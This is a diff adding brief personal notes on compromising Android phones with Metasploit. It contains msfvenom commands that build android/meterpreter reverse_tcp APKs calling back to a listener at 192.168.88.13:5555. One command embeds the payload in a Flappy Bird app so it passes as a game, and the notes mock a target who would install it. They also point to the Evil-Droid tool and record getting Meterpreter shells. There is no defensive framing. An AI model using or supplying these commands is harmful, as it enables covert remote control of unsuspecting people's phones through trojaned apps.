@@ -1,0 +1,19 @@
+using msfsploit and msfvenom
+
+msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.88.13 lport=5555 -o shell.apk -> if the target is stupid enough to install this
+
+use exploit/multi/handler ...
+
+got meterpreter shell
+
+
+
+lets use evil-droid https://github.com/M4sc3r4n0/Evil-Droid
+chmod + run as sudo
+
+
+msfvenom -x flappy-bird-1-3-en-android.apk -p android/meterpreter/reverse_tcp lhost=192.168.88.13 lport=5555 -o flappy.apk
+
+use exploit/multi/handler ...
+
+got meterpreter shell
